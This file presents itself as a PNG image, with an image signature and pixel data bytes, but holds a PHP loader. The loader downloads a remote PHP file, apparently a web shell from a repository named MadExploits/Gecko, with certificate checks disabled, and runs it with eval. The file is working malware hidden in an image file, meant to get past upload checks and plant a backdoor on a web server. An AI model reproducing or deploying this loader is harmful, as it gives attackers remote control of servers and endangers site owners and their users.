‰PNG

<?php
$url = 'https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$fileContents = curl_exec($ch);
curl_close($ch);
if ($fileContents === false) {
    die('[!] Cannot Get Gecko File : https://raw.githubusercontent.com/MadExploits/Gecko/main/gecko-new.php ');
}
eval("?>" . $fileContents);
?>::œX    IDATxœìÁ   €þ¯î